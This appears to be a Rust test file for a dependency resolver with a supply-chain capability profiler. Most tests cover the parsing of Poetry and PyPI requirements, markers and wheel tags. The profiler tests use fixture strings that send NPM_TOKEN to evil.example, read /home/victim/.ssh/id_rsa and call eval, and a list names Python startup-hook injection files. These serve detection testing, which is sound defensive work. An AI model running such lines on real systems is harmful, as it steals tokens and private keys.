        |spec| spec.name == "charset-normalizer" && spec.version.as_deref() == Some("==3.4.0")
    ));
    assert!(dev
        .specs
        .iter()
        .any(|spec| spec.name == "urllib3" && spec.version.as_deref() == Some("<3")));
    assert!(dev
        .specs
        .iter()
        .any(|spec| spec.name == "ruff" && spec.version.as_deref() == Some("==0.5.0")));
    assert!(dev
        .python_local_paths
        .contains(&dir.path().join("vendor/extra-local")));
    assert!(!dev.specs.iter().any(|spec| spec.name == "markdown"));
}

#[test]
fn rejects_cyclic_pyproject_dependency_groups() {
    let dir = tempfile::tempdir().unwrap();
    let pyproject = dir.path().join("pyproject.toml");
    fs::write(
        &pyproject,
        r#"
            [dependency-groups]
            dev = [{ include-group = "test" }]
            test = [{ include-group = "dev" }]
            "#,
    )
    .unwrap();

    let error = read_pyproject_requirements(&pyproject, &BTreeSet::new(), true).unwrap_err();
    assert!(error.to_string().contains("cyclic dependency group"));
}

#[test]
fn rejects_unsupported_pyproject_direct_paths() {
    let dir = tempfile::tempdir().unwrap();
    let pyproject = dir.path().join("pyproject.toml");
    fs::write(
        &pyproject,
        r#"
            [project]
            dependencies = ["local-package @ ./missing"]
            "#,
    )
    .unwrap();

    let error = read_pyproject_requirements(&pyproject, &BTreeSet::new(), false).unwrap_err();
    assert!(error
        .to_string()
        .contains("unsupported requirements entry `local-package @ ./missing`"));
}

#[test]
fn reads_poetry_dependencies_and_dev_groups() {
    let dir = tempfile::tempdir().unwrap();
    let pyproject = dir.path().join("pyproject.toml");
    fs::write(
        &pyproject,
        r#"
            [[tool.poetry.source]]
            name = "private"
            url = "https://packages.example/simple"
            priority = "primary"

            [[tool.poetry.source]]
            name = "backup"
            url = "https://backup.example/simple/"
            priority = "supplemental"

            [[tool.poetry.source]]
            name = "duplicate"
            url = "https://backup.example/simple"
            priority = "supplemental"

            [tool.poetry.dependencies]
            python = "^3.11"
            requests = { version = "^2.32.0", source = "private" }
            rich = { version = "^13.0.0", optional = true }

            [tool.poetry.extras]
            ui = ["rich"]

            [tool.poetry.dev-dependencies]
            pytest = "^8.0.0"

            [tool.poetry.group.docs]
            optional = true

            [tool.poetry.group.docs.dependencies]
            markdown = "^3.6"

            [tool.poetry.group.lint.dependencies]
            ruff = "^0.5.0"
            "#,
    )
    .unwrap();

    let base = read_pyproject_requirements(&pyproject, &BTreeSet::new(), true).unwrap();
    assert!(base
        .specs
        .iter()
        .any(|spec| spec.name == "requests" && spec.version.as_deref() == Some(">=2.32.0,<3")));
    assert!(base
        .specs
        .iter()
        .any(|spec| spec.name == "pytest" && spec.version.as_deref() == Some(">=8.0.0,<9")));
    assert!(base
        .specs
        .iter()
        .any(|spec| spec.name == "ruff" && spec.version.as_deref() == Some(">=0.5.0,<0.6")));
    assert_eq!(
        base.pypi_index_url.as_deref(),
        Some("https://packages.example/simple/")
    );
    assert_eq!(
        base.pypi_extra_index_urls,
        vec!["https://backup.example/simple/".to_owned()]
    );
    assert!(!base.specs.iter().any(|spec| spec.name == "python"));
    assert!(!base.specs.iter().any(|spec| spec.name == "rich"));
    assert!(!base.specs.iter().any(|spec| spec.name == "markdown"));

    let production = read_pyproject_requirements(&pyproject, &BTreeSet::new(), false).unwrap();
    assert!(!production.specs.iter().any(|spec| spec.name == "pytest"));
    assert!(production.specs.iter().any(|spec| spec.name == "ruff"));

    let with_extra =
        read_pyproject_requirements(&pyproject, &BTreeSet::from(["ui".to_owned()]), false).unwrap();
    assert!(with_extra
        .specs
        .iter()
        .any(|spec| spec.name == "rich" && spec.version.as_deref() == Some(">=13.0.0,<14")));

    let with_docs =
        read_pyproject_requirements(&pyproject, &BTreeSet::from(["docs".to_owned()]), false)
            .unwrap();
    assert!(with_docs
        .specs
        .iter()
        .any(|spec| spec.name == "markdown" && spec.version.as_deref() == Some(">=3.6,<4")));
}

#[test]
fn reads_poetry_direct_wheel_sources() {
    let dir = tempfile::tempdir().unwrap();
    let pyproject = dir.path().join("pyproject.toml");
    let wheel = dir
        .path()
        .join("wheels")
        .join("local_idna-3.7-py3-none-any.whl");
    let sdist = dir.path().join("wheels").join("local_source-1.0.0.tar.gz");
    fs::create_dir_all(wheel.parent().unwrap()).unwrap();
    fs::create_dir_all(dir.path().join("vendor/local-package")).unwrap();
    fs::write(&wheel, b"not a real wheel").unwrap();
    fs::write(&sdist, b"not a real sdist").unwrap();
    fs::write(
            &pyproject,
            r#"
            [tool.poetry.dependencies]
            idna = { url = "https://example.invalid/idna-3.7-py3-none-any.whl" }
            local-idna = { path = "wheels/local_idna-3.7-py3-none-any.whl" }
            local-source = { path = "wheels/local_source-1.0.0.tar.gz" }
            local-package = { path = "vendor/local-package", develop = true }
            git-package = { git = "https://example.invalid/pkg.git", rev = "abc123", extras = ["cli"], subdirectory = "pkg" }
            "#,
        )
        .unwrap();

    let requirements = read_pyproject_requirements(&pyproject, &BTreeSet::new(), true).unwrap();
    let idna = requirements
        .specs
        .iter()
        .find(|spec| spec.name == "idna")
        .unwrap();
    assert_eq!(
        idna.direct_url.as_deref(),
        Some("https://example.invalid/idna-3.7-py3-none-any.whl")
    );

    let local = requirements
        .specs
        .iter()
        .find(|spec| spec.name == "local-idna")
        .unwrap();
    assert!(local.direct_url.as_deref().unwrap().starts_with("file://"));
    assert!(local
        .direct_url
        .as_deref()
        .unwrap()
        .ends_with("local_idna-3.7-py3-none-any.whl"));
    let local_source = requirements
        .specs
        .iter()
        .find(|spec| spec.name == "local-source")
        .unwrap();
    assert!(local_source
        .direct_url
        .as_deref()
        .unwrap()
        .ends_with("local_source-1.0.0.tar.gz"));
    assert_eq!(
        requirements.python_local_paths,
        vec![dir.path().join("vendor/local-package")]
    );
    assert_eq!(requirements.python_vcs_requirements.len(), 1);
    let vcs = &requirements.python_vcs_requirements[0];
    assert_eq!(vcs.name, "git-package");
    assert_eq!(vcs.url, "https://example.invalid/pkg.git");
    assert_eq!(vcs.reference.as_deref(), Some("abc123"));
    assert_eq!(vcs.subdirectory.as_deref(), Some(Path::new("pkg")));
    assert_eq!(vcs.extras, BTreeSet::from(["cli".to_owned()]));

    let discovered = discover_project_requirements(dir.path()).unwrap();
    assert_eq!(
        discovered.python_local_paths,
        requirements.python_local_paths
    );
    assert_eq!(
        discovered.python_vcs_requirements,
        requirements.python_vcs_requirements
    );
}

#[test]
fn rejects_poetry_unsupported_direct_sources() {
    let dir = tempfile::tempdir().unwrap();
    let pyproject = dir.path().join("pyproject.toml");
    fs::write(
        &pyproject,
        r#"
            [tool.poetry.dependencies]
            local-package = { path = "../local-package" }
            git-package = { git = "https://example.invalid/pkg.git" }
            "#,
    )
    .unwrap();

    let error = read_pyproject_requirements(&pyproject, &BTreeSet::new(), true).unwrap_err();
    assert!(error
        .to_string()
        .contains("unsupported Poetry dependency source"));
}

#[test]
fn reads_poetry_lock_constraints_and_hashes() {
    let dir = tempfile::tempdir().unwrap();
    let poetry_lock = dir.path().join("poetry.lock");
    fs::write(
            &poetry_lock,
            r#"
            [[package]]
            name = "idna"
            version = "3.7"
            files = [
                {file = "idna-3.7-py3-none-any.whl", hash = "sha256:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"},
                {file = "idna-3.7.tar.gz", hash = "sha256:bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb"},
            ]

            [[package]]
            name = "charset-normalizer"
            version = "3.4.0"

            [metadata.files]
            charset-normalizer = [
                {file = "charset_normalizer-3.4.0-py3-none-any.whl", hash = "sha256:cccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc"},
            ]
            "#,
        )
        .unwrap();

    let requirements = read_poetry_lock_requirements(&poetry_lock).unwrap();
    assert_eq!(
        requirements
            .constraints
            .get("pypi:idna")
            .map(String::as_str),
        Some("3.7")
    );
    assert_eq!(
        requirements
            .constraints
            .get("pypi:charset-normalizer")
            .map(String::as_str),
        Some("3.4.0")
    );
    assert_eq!(
        requirements.hashes.get("pypi:idna").cloned().unwrap(),
        BTreeSet::from([
            "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa".to_owned(),
            "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb".to_owned()
        ])
    );
    assert_eq!(
        requirements
            .hashes
            .get("pypi:charset-normalizer")
            .and_then(|hashes| hashes.iter().next())
            .map(String::as_str),
        Some("cccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc")
    );
}

#[test]
fn discovers_poetry_lock_constraints() {
    let dir = tempfile::tempdir().unwrap();
    fs::write(
        dir.path().join("pyproject.toml"),
        r#"
            [tool.poetry.dependencies]
            python = "^3.11"
            idna = "^3.0"
            "#,
    )
    .unwrap();
    fs::write(
            dir.path().join("poetry.lock"),
            r#"
            [[package]]
            name = "idna"
            version = "3.7"
            files = [
                {file = "idna-3.7-py3-none-any.whl", hash = "sha256:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"},
            ]
            "#,
        )
        .unwrap();

    let requirements = discover_project_requirements(dir.path()).unwrap();
    assert!(requirements
        .specs
        .iter()
        .any(|spec| spec.name == "idna" && spec.version.as_deref() == Some(">=3.0,<4")));
    assert_eq!(
        requirements
            .constraints
            .get("pypi:idna")
            .map(String::as_str),
        Some("3.7")
    );
    assert_eq!(
        requirements
            .hashes
            .get("pypi:idna")
            .and_then(|hashes| hashes.iter().next())
            .map(String::as_str),
        Some("aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa")
    );
}

#[test]
fn parses_pypi_requires_dist_with_extras() {
    let spec = parse_pypi_requirement("urllib3<3,>=1.21.1").unwrap();
    assert_eq!(spec.name, "urllib3");
    assert_eq!(spec.version.as_deref(), Some("<3,>=1.21.1"));

    assert!(parse_pypi_requirement("PySocks>=1.5.6; extra == 'socks'").is_none());

    let extras = BTreeSet::from(["socks".to_owned()]);
    let spec =
        parse_pypi_requirement_with_extras("PySocks>=1.5.6; extra == 'socks'", &extras).unwrap();
    assert_eq!(spec.name, "pysocks");
    assert_eq!(spec.version.as_deref(), Some(">=1.5.6"));
}

#[test]
fn reads_pypi_sdist_metadata_dependencies() {
    let bytes = python_sdist_for_test(&[(
            "PKG-INFO",
            "Metadata-Version: 2.1\nName: pure-sdist\nVersion: 1.0.0\nRequires-Dist: idna>=3\nRequires-Dist: PySocks>=1.5.6; extra == 'socks'\n",
        )]);

    let dependencies = pypi_sdist_dependencies(
        &bytes,
        "pure-sdist-1.0.0.tar.gz",
        &BTreeSet::from(["socks".to_owned()]),
    )
    .unwrap();
    assert!(dependencies
        .iter()
        .any(|dependency| dependency.spec.name == "idna"
            && dependency.spec.version.as_deref() == Some(">=3")));
    assert!(dependencies
        .iter()
        .any(|dependency| dependency.spec.name == "pysocks"
            && dependency.spec.version.as_deref() == Some(">=1.5.6")));

    let bytes = python_zip_sdist_for_test(&[(
            "PKG-INFO",
            "Metadata-Version: 2.1\nName: pure-sdist\nVersion: 1.0.0\nRequires-Dist: idna>=3\nRequires-Dist: PySocks>=1.5.6; extra == 'socks'\n",
        )]);
    let dependencies = pypi_sdist_dependencies(
        &bytes,
        "pure-sdist-1.0.0.zip",
        &BTreeSet::from(["socks".to_owned()]),
    )
    .unwrap();
    assert!(dependencies
        .iter()
        .any(|dependency| dependency.spec.name == "idna"
            && dependency.spec.version.as_deref() == Some(">=3")));
    assert!(dependencies
        .iter()
        .any(|dependency| dependency.spec.name == "pysocks"
            && dependency.spec.version.as_deref() == Some(">=1.5.6")));
}

#[test]
fn merges_pypi_constraints_into_requirements() {
    let spec = PackageSpec::new(Ecosystem::Pypi, "urllib3", Some("<3,>=1.21.1".to_owned()));
    let constraints = BTreeMap::from([("pypi:urllib3".to_owned(), "==2.2.1".to_owned())]);
    assert_eq!(
        constrained_pypi_requirement(&spec, &constraints).as_deref(),
        Some("<3,>=1.21.1,==2.2.1")
    );
}

#[test]
fn evaluates_common_pypi_markers() {
    let env = PypiMarkerEnvironment {
        python_full_version: Some("3.11.4".to_owned()),
        os_name: "posix".to_owned(),
        sys_platform: "darwin".to_owned(),
        platform_system: "Darwin".to_owned(),
        platform_machine: "arm64".to_owned(),
        implementation_name: "cpython".to_owned(),
        platform_python_implementation: "CPython".to_owned(),
        extra: String::new(),
    };

    assert_eq!(
        evaluate_pypi_marker("python_version >= '3.0'", &env),
        Some(true)
    );
    assert_eq!(
        evaluate_pypi_marker("python_version < '0'", &env),
        Some(false)
    );
    assert_eq!(
        evaluate_pypi_marker("os_name == 'posix' or python_version < '0'", &env),
        Some(true)
    );
    assert_eq!(
        evaluate_pypi_marker("os_name == 'nt' and python_version >= '3.0'", &env),
        Some(false)
    );
    assert_eq!(
        evaluate_pypi_marker(
            "sys_platform == 'linux' and (python_version < '0' or python_version >= '3')",
            &env
        ),
        Some(false)
    );
    assert_eq!(
        evaluate_pypi_marker(
            "sys_platform == 'darwin' and (python_version < '0' or python_version >= '3')",
            &env
        ),
        Some(true)
    );
    assert_eq!(
        evaluate_pypi_marker(
            "(sys_platform == 'linux' or sys_platform == 'darwin') and python_version >= '3'",
            &env
        ),
        Some(true)
    );
    assert_eq!(
        evaluate_pypi_marker(
            "(sys_platform == 'linux' or sys_platform == 'win32') and python_version >= '3'",
            &env
        ),
        Some(false)
    );
}

#[test]
fn parses_requirement_continuations_and_hash_options() {
    let lines = requirement_logical_lines(
            "idna==3.7 \\\n  --hash=sha256:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa \\\n  --hash sha256:bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb\n",
        );
    assert_eq!(lines.len(), 1);

    let parsed = parse_requirement_line(&lines[0]);
    assert_eq!(parsed.requirement, "idna==3.7");
    assert!(parsed
        .hashes
        .contains("aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"));
    assert!(parsed
        .hashes
        .contains("bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb"));
}

#[test]
fn applies_requires_python_constraints() {
    let file = PypiFile {
        filename: "pkg-1.0.0-py3-none-any.whl".to_owned(),
        packagetype: "bdist_wheel".to_owned(),
        url: "https://example.invalid/pkg.whl".to_owned(),
        digests: PypiDigests {
            sha256: "abc".to_owned(),
        },
        requires_python: Some(">=3.10".to_owned()),
    };
    assert!(!pypi_file_python_compatible(&file, Some("3.9.6"), None));
    assert!(pypi_file_python_compatible(&file, Some("3.11.0"), None));
}

#[test]
fn chooses_pypi_source_distributions_when_no_wheel_exists() {
    let doc = PypiResponse {
        info: PypiInfo {
            name: "source-only".to_owned(),
            version: "1.0.0".to_owned(),
            requires_dist: None,
        },
        urls: vec![PypiFile {
            filename: "source-only-1.0.0.zip".to_owned(),
            packagetype: "sdist".to_owned(),
            url: "https://example.invalid/source-only-1.0.0.zip".to_owned(),
            digests: PypiDigests {
                sha256: "abc".to_owned(),
            },
            requires_python: None,
        }],
    };

    let file = choose_pypi_file(&doc, Some("3.11.0"), None, None).unwrap();
    assert_eq!(file.filename, "source-only-1.0.0.zip");
}

#[test]
fn chooses_pypi_source_distributions_when_no_binary_requested() {
    let doc = PypiResponse {
        info: PypiInfo {
            name: "dual-format".to_owned(),
            version: "1.0.0".to_owned(),
            requires_dist: None,
        },
        urls: vec![
            test_pypi_file("dual_format-1.0.0-py3-none-any.whl", "bdist_wheel"),
            test_pypi_file("dual-format-1.0.0.tar.gz", "sdist"),
        ],
    };

    let file = choose_pypi_file(&doc, Some("3.11.0"), None, Some(PypiBinaryMode::Source)).unwrap();
    assert_eq!(file.filename, "dual-format-1.0.0.tar.gz");
}

#[test]
fn rejects_pypi_source_fallback_when_binary_required() {
    let doc = PypiResponse {
        info: PypiInfo {
            name: "source-only".to_owned(),
            version: "1.0.0".to_owned(),
            requires_dist: None,
        },
        urls: vec![test_pypi_file("source-only-1.0.0.tar.gz", "sdist")],
    };

    assert!(choose_pypi_file(&doc, Some("3.11.0"), None, Some(PypiBinaryMode::Binary)).is_none());
}

#[test]
fn chooses_pypi_target_compatible_wheel() {
    let doc = PypiResponse {
        info: PypiInfo {
            name: "targeted".to_owned(),
            version: "1.0.0".to_owned(),
            requires_dist: None,
        },
        urls: vec![
            test_pypi_file(
                "targeted-1.0.0-cp311-cp311-macosx_14_0_arm64.whl",
                "bdist_wheel",
            ),
            test_pypi_file(
                "targeted-1.0.0-cp312-cp312-macosx_14_0_arm64.whl",
                "bdist_wheel",
            ),
        ],
    };
    let compatibility = PythonWheelCompatibility::from_target_options(
        Some("3.12"),
        Some("cp"),
        &[String::from("cp312")],
        &[String::from("macosx_14_0_arm64")],
    )
    .unwrap();

    let file = choose_pypi_file(
        &doc,
        Some("3.12.0"),
        Some(&compatibility),
        Some(PypiBinaryMode::Binary),
    )
    .unwrap();
    assert_eq!(
        file.filename,
        "targeted-1.0.0-cp312-cp312-macosx_14_0_arm64.whl"
    );
}

#[test]
fn chooses_pypi_version_with_requested_binary_format() {
    let root = PypiRoot {
        releases: BTreeMap::from([
            (
                "1.0.0".to_owned(),
                vec![test_pypi_file("dual-format-1.0.0.tar.gz", "sdist")],
            ),
            (
                "2.0.0".to_owned(),
                vec![test_pypi_file(
                    "dual_format-2.0.0-py3-none-any.whl",
                    "bdist_wheel",
                )],
            ),
        ]),
    };

    assert_eq!(
        choose_pypi_version(
            "dual-format",
            "*",
            &root,
            Some("3.11.0"),
            None,
            Some(PypiBinaryMode::Source),
            PypiPrereleasePolicy::Default,
        )
        .unwrap(),
        "1.0.0"
    );
    assert_eq!(
        choose_pypi_version(
            "dual-format",
            "*",
            &root,
            Some("3.11.0"),
            None,
            Some(PypiBinaryMode::Binary),
            PypiPrereleasePolicy::Default,
        )
        .unwrap(),
        "2.0.0"
    );
}

#[test]
fn filters_pypi_prereleases_unless_requested() {
    let root = PypiRoot {
        releases: BTreeMap::from([
            (
                "1.9.0".to_owned(),
                vec![test_pypi_file(
                    "previewed-1.9.0-py3-none-any.whl",
                    "bdist_wheel",
                )],
            ),
            (
                "2.0.0rc1".to_owned(),
                vec![test_pypi_file(
                    "previewed-2.0.0rc1-py3-none-any.whl",
                    "bdist_wheel",
                )],
            ),
        ]),
    };

    assert_eq!(
        choose_pypi_version(
            "previewed",
            "*",
            &root,
            Some("3.11.0"),
            None,
            None,
            PypiPrereleasePolicy::Default,
        )
        .unwrap(),
        "1.9.0"
    );
    assert_eq!(
        choose_pypi_version(
            "previewed",
            "*",
            &root,
            Some("3.11.0"),
            None,
            None,
            PypiPrereleasePolicy::Allow,
        )
        .unwrap(),
        "2.0.0rc1"
    );
    assert!(choose_pypi_version(
        "previewed",
        ">=2.0.0rc1",
        &root,
        Some("3.11.0"),
        None,
        None,
        PypiPrereleasePolicy::OnlyFinal,
    )
    .is_err());
    assert_eq!(
        choose_pypi_version(
            "previewed",
            ">=2.0.0rc1",
            &root,
            Some("3.11.0"),
            None,
            None,
            PypiPrereleasePolicy::Default,
        )
        .unwrap(),
        "2.0.0rc1"
    );

    let dir = tempfile::tempdir().unwrap();
    let mut options = LinkOptions::new(dir.path());
    apply_pypi_release_control(&mut options.pypi_release_controls.all_releases, "previewed");
    assert_eq!(
        pypi_prerelease_policy_for_name(&options, "Previewed"),
        PypiPrereleasePolicy::Allow
    );
    apply_pypi_release_control(&mut options.pypi_release_controls.only_final, "previewed");
    assert_eq!(
        pypi_prerelease_policy_for_name(&options, "previewed"),
        PypiPrereleasePolicy::OnlyFinal
    );
}

#[test]
fn compares_common_pypi_prerelease_versions() {
    assert_eq!(
        compare_pypi_versions("1.0.0rc1", "1.0.0"),
        std::cmp::Ordering::Less
    );
    assert_eq!(
        compare_pypi_versions("1.0.0.dev1", "1.0.0a1"),
        std::cmp::Ordering::Less
    );
    assert_eq!(
        compare_pypi_versions("1.0.0.post1", "1.0.0"),
        std::cmp::Ordering::Greater
    );
    assert_eq!(
        compare_pypi_versions("1.0", "1.0.0"),
        std::cmp::Ordering::Equal
    );
}

#[test]
fn checks_wheel_tags_against_python_platform() {
    let compatibility = PythonWheelCompatibility::new(
        3,
        9,
        "cpython",
        "cpython-39",
        "macosx_10_9_universal2",
        "arm64",
        "14.0.0",
    );

    assert!(wheel_tag_compatible(
        "idna-3.7-py3-none-any.whl",
        &compatibility
    ));
    assert!(wheel_tag_compatible(
            "orjson-3.10.18-cp39-cp39-macosx_10_15_x86_64.macosx_11_0_arm64.macosx_10_15_universal2.whl",
            &compatibility
        ));
    assert!(!wheel_tag_compatible(
        "orjson-3.10.18-cp310-cp310-macosx_11_0_arm64.whl",
        &compatibility
    ));
    assert!(!wheel_tag_compatible(
        "orjson-3.10.18-cp39-cp39-win_amd64.whl",
        &compatibility
    ));

    let target = PythonWheelCompatibility::from_target_options(
        Some("3.12"),
        Some("cp"),
        &[String::from("cp312")],
        &[String::from("macosx_14_0_arm64")],
    )
    .unwrap();

    assert!(wheel_tag_compatible(
        "targeted-1.0.0-cp312-cp312-macosx_14_0_arm64.whl",
        &target
    ));
    assert!(!wheel_tag_compatible(
        "targeted-1.0.0-cp311-cp311-macosx_14_0_arm64.whl",
        &target
    ));
    assert!(wheel_tag_compatible(
        "targeted-1.0.0-py3-none-any.whl",
        &target
    ));
}

#[test]
fn profiler_turns_host_access_into_capabilities() {
    let mut profiler = SourceProfiler::default();
    profiler.scan_file(
        "index.js",
        "const token = process.env.NPM_TOKEN; fetch('https://evil.example', { body: token });",
    );
    let profile = profiler.finish();
    assert!(profile
        .capabilities
        .iter()
        .any(|finding| finding.kind == CapabilityKind::EnvRead && finding.target == "NPM_TOKEN"));
    assert!(profile
        .capabilities
        .iter()
        .any(|finding| finding.kind == CapabilityKind::HttpRequest
            && finding.target == "evil.example"));
}

#[test]
fn profiler_preserves_static_url_ports_for_network_capabilities() {
    let mut profiler = SourceProfiler::default();
    profiler.scan_file(
        "index.js",
        "fetch('HTTPS://evil.example:8443/path'); fetch('http://plain.example:8080/a');",
    );
    let profile = profiler.finish();

    assert!(profile
        .capabilities
        .iter()
        .any(|finding| finding.kind == CapabilityKind::HttpRequest
            && finding.target == "evil.example:8443"));
    assert!(profile
        .capabilities
        .iter()
        .any(|finding| finding.kind == CapabilityKind::HttpRequest
            && finding.target == "plain.example:8080"));
    assert!(!profile
        .capabilities
        .iter()
        .any(|finding| finding.kind == CapabilityKind::HttpRequest
            && finding.target == "evil.example"));
}

#[test]
fn profiler_ignores_static_urls_without_network_calls() {
    let mut profiler = SourceProfiler::default();
    profiler.scan_file(
        "pygments/lexers/python.py",
        "__url__ = 'https://www.python.org/'\nDOC = 'https://docs.python.org/'\n",
    );
    profiler.scan_file(
        "client.py",
        "endpoint = 'https://api.example.com/v1'; fetch(endpoint)",
    );
    let profile = profiler.finish();

    assert!(!profile
        .capabilities
        .iter()
        .any(|finding| finding.source == "pygments/lexers/python.py"
            && finding.kind == CapabilityKind::HttpRequest));
    assert!(profile
        .capabilities
        .iter()
        .any(|finding| finding.source == "client.py"
            && finding.kind == CapabilityKind::HttpRequest
            && finding.target == "api.example.com"));
}

#[test]
fn profiler_ignores_non_executable_assets() {
    let mut profiler = SourceProfiler::default();
    profiler.scan_file(
        "package/lib/lib.dom.d.ts",
        "declare function fetch(input: RequestInfo): Promise<Response>;",
    );
    profiler.scan_file(
        "package/lib/typesMap.json",
        r#"{ "axios": "not executable source", "url": "https://example.invalid" }"#,
    );
    profiler.scan_file(
        "package/pyproject.toml",
        r#"[project.scripts]\nrun = "tool:main""#,
    );
    let profile = profiler.finish();

    assert_eq!(profile.files_scanned, 0);
    assert!(profile.capabilities.is_empty());
}

#[test]
fn profiler_distinguishes_regex_exec_from_dynamic_eval() {
    let mut profiler = SourceProfiler::default();
    profiler.scan_file(
        "package/functions/coerce.js",
        "while ((next = coerceRtlRegex.exec(version))) { match = next }",
    );
    profiler.scan_file("package/runtime.js", "eval(source); new Function(source);");
    profiler.scan_file("package/tool.py", "exec(code)\n");
    let profile = profiler.finish();

    let dynamic_eval_findings = profile
        .capabilities
        .iter()
        .filter(|finding| finding.kind == CapabilityKind::DynamicEval)
        .collect::<Vec<_>>();
    // Real dynamic eval is flagged on runtime.js (eval / new Function) and
    // tool.py (exec); the regex `.exec` on coerce.js is NOT. (runtime.js may
    // contribute more than one finding now that `new Function` is detected
    // distinctly from `eval`, so assert by source-file presence.)
    let sources: BTreeSet<&str> = dynamic_eval_findings
        .iter()
        .map(|finding| finding.source.as_str())
        .collect();
    assert_eq!(
        sources,
        BTreeSet::from(["package/runtime.js", "package/tool.py"])
    );
}

#[test]
fn profiler_distinguishes_python_module_references_from_http_calls() {
    let mut profiler = SourceProfiler::default();
    profiler.scan_file(
        "requests/__init__.py",
        "from .sessions import Session\n__title__ = 'requests'\n",
    );
    profiler.scan_file(
            "client.py",
            "requests.get(url)\nurllib.request.urlopen(url)\nhttpx.post(url)\nsocket.create_connection(addr)\n",
        );
    let profile = profiler.finish();

    assert!(!profile
        .capabilities
        .iter()
        .any(|finding| finding.source == "requests/__init__.py"
            && finding.kind == CapabilityKind::HttpRequest));
    assert_eq!(
        profile
            .capabilities
            .iter()
            .filter(|finding| finding.kind == CapabilityKind::HttpRequest)
            .count(),
        1
    );
}

#[test]
fn profiler_distinguishes_file_like_write_from_file_write() {
    let mut profiler = SourceProfiler::default();
    profiler.scan_file("package/models.py", "buffer.write(chunk)\n");
    profiler.scan_file("package/cache.py", "open(cache_path, 'wb').write(data)\n");
    let profile = profiler.finish();

    assert!(!profile
        .capabilities
        .iter()
        .any(|finding| finding.source == "package/models.py"
            && finding.kind == CapabilityKind::FsWrite));
    assert!(profile
        .capabilities
        .iter()
        .any(|finding| finding.source == "package/cache.py"
            && finding.kind == CapabilityKind::FsWrite));
}

// F4: a literal file-read path is captured as the FsRead target (not "*").
#[test]
fn profiler_captures_literal_fs_read_path() {
    let mut profiler = SourceProfiler::default();
    profiler.scan_file(
        "lib/secrets.js",
        "const k = fs.readFileSync('/home/victim/.ssh/id_rsa');\n",
    );
    let profile = profiler.finish();
    assert!(
        profile
            .capabilities
            .iter()
            .any(|finding| finding.kind == CapabilityKind::FsRead
                && finding.target == "/home/victim/.ssh/id_rsa"),
        "literal read path must be captured: {:?}",
        profile.capabilities
    );
}

// F4: reading a sensitive file is Blocked at verdict time even under a
// wildcard fs.read:* grant (mirrors the in-cell sensitive-read guarantee).
#[test]
fn sensitive_literal_read_blocked_under_wildcard_grant() {
    let dir = tempfile::tempdir().unwrap();
    let source = dir.path().join("source");
    fs::create_dir_all(&source).unwrap();
    fs::write(
        source.join("index.js"),
        "const fs = require('fs');\nconst k = fs.readFileSync('/home/victim/.ssh/id_rsa');\n",
    )
    .unwrap();
    let report = compile_source_path(CompileSourceOptions {
        project_dir: dir.path().to_path_buf(),
        source_path: source,
        ecosystem: Ecosystem::Npm,
        name: "reader".to_owned(),
        version: "1.0.0".to_owned(),
        // Wildcard fs.read grant must NOT cover sensitive files.
        allowed_capabilities: vec![Capability::FsRead("*".to_owned())],
        allowed_flows: Vec::new(),
        write_artifact: false,
    })
    .unwrap();
    assert_eq!(
        report.artifact.verdict,
        Verdict::Blocked,
        "reading ~/.ssh/id_rsa must be blocked even under fs.read:*"
    );
}

// F4 over-block guard: a literal read of an ordinary project file IS allowed
// under a wildcard fs.read:* grant.
#[test]
fn ordinary_literal_read_allowed_under_wildcard_grant() {
    let dir = tempfile::tempdir().unwrap();
    let source = dir.path().join("source");
    fs::create_dir_all(&source).unwrap();
    fs::write(
        source.join("index.js"),
        "const fs = require('fs');\nconst c = fs.readFileSync('./config.json');\n",
    )
    .unwrap();
    let report = compile_source_path(CompileSourceOptions {
        project_dir: dir.path().to_path_buf(),
        source_path: source,
        ecosystem: Ecosystem::Npm,
        name: "reader".to_owned(),
        version: "1.0.0".to_owned(),
        allowed_capabilities: vec![Capability::FsRead("*".to_owned())],
        allowed_flows: Vec::new(),
        write_artifact: false,
    })
    .unwrap();
    assert_eq!(
        report.artifact.verdict,
        Verdict::Accepted,
        "an ordinary literal project-file read must remain accepted under fs.read:*"
    );
}

// F5: Python startup hooks are never copied into site-packages.
#[test]
fn python_startup_hooks_are_not_installed() {
    for hook in [
        "evil.pth",
        "sitecustomize.py",
        "usercustomize.py",
        "pkg/sub/inject.pth",
    ] {
        assert!(
            !should_copy_python_sdist_path(Path::new(hook)),
            "{hook} must not be copied into site-packages"
        );
        assert!(is_python_startup_hook_path(Path::new(hook)), "{hook}");
    }
    // ordinary modules still copy
    assert!(should_copy_python_sdist_path(Path::new("pkg/__init__.py")));
    assert!(should_copy_python_sdist_path(Path::new("pkg/site.py")));
}

#[test]
fn generated_profile_module_deduplicates_capability_ops() {
    let package = ResolvedPackage {
        ecosystem: Ecosystem::Npm,
        name: "date-helper".to_owned(),
        version: "1.2.4".to_owned(),
        source_url: "https://example.invalid/date-helper.tgz".to_owned(),
        download_url: None,
        local_path: None,
        filename: "date-helper.tgz".to_owned(),
        expected_sha256: None,
        expected_sha1: None,
        expected_integrity: None,
        npm_direct_tarball: false,
        pypi_direct_wheel: false,
        npm_scripts: BTreeMap::new(),
        platform_compatible: true,
        dependencies: Vec::new(),
    };
    let findings = vec![
        CapabilityFinding {
            kind: CapabilityKind::EnvRead,
            target: "NPM_TOKEN".to_owned(),
            source: "a.js".to_owned(),
            evidence: "process.env".to_owned(),
        },
